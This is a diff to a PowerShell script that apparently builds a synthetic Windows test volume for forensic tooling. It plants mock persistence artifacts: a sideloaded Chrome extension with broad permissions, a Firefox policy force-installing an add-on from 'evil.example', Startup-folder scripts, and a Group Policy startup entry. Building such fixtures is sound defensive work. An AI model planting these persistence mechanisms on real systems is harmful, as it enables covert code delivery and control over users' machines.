@@ -122,6 +122,24 @@ $facts = [ordered]@{
     sam = File-Facts "$v\old\SAM"
 }
 
+# --- stage 2b: browser profiles, Startup folders, Group Policy scripts (synthetic) ---
+$chrome = "$v\Users\bob\AppData\Local\Google\Chrome\User Data\Default"
+$ff = "$v\Users\bob\AppData\Roaming\Mozilla\Firefox\Profiles\lab.default"
+New-Item -ItemType Directory -Force "$chrome\Extensions\abcdefghijklmnopabcdefghijklmnop\1.0_0", "$chrome\Cache", "$ff\extensions",
+    "$v\Users\bob\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup",
+    "$v\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp",
+    "$v\Windows\System32\GroupPolicy\Machine\Scripts\Startup",
+    "$v\Program Files\Mozilla Firefox\distribution" | Out-Null
+Set-Content -Path "$chrome\Preferences" -Encoding ascii -Value '{"extensions":{"settings":{"abcdefghijklmnopabcdefghijklmnop":{"location":4,"from_webstore":false,"state":1,"install_time":"13345000000000000","path":"C:\\carvetest\\ext","manifest":{"name":"Lab Loader win","version":"1.0","permissions":["webRequest","<all_urls>"]}}}}}'
+Set-Content -Path "$chrome\Extensions\abcdefghijklmnopabcdefghijklmnop\1.0_0\manifest.json" -Encoding ascii -Value '{"name":"Lab Loader win","version":"1.0","permissions":["webRequest","<all_urls>"]}'
+[IO.File]::WriteAllBytes("$chrome\Cache\data_0", (New-Object byte[] 65536))
+Set-Content -Path "$ff\extensions.json" -Encoding ascii -Value '{"addons":[{"id":"lab-win@faramir","type":"extension","version":"1","location":"app-system-share","sourceURI":null,"installDate":1700000000000,"userDisabled":false,"active":true,"defaultLocale":{"name":"Lab Addon win"},"userPermissions":{"permissions":["nativeMessaging"],"origins":[]}}]}'
+Set-Content -Path "$v\Program Files\Mozilla Firefox\distribution\policies.json" -Encoding ascii -Value '{"policies":{"Extensions":{"Install":["https://evil.example/win.xpi"]}}}'
+Set-Content -Path "$v\Users\bob\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\lab_user_startup.bat" -Encoding ascii -Value 'C:\carvetest\user_startup.exe'
+Set-Content -Path "$v\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\lab_common_startup.cmd" -Encoding ascii -Value 'C:\carvetest\common_startup.exe'
+Set-Content -Path "$v\Windows\System32\GroupPolicy\Machine\Scripts\scripts.ini" -Encoding unicode -Value "`r`n[Startup]`r`n0CmdLine=C:\carvetest\gpo_startup.ps1`r`n0Parameters=-lab`r`n"
+Write-VolumeCache $letter
+
 # shadow copy with everything in place
 $shadow = (& vssadmin create shadow /for=$v 2>&1) -join ' '
 Start-Sleep -Seconds 3
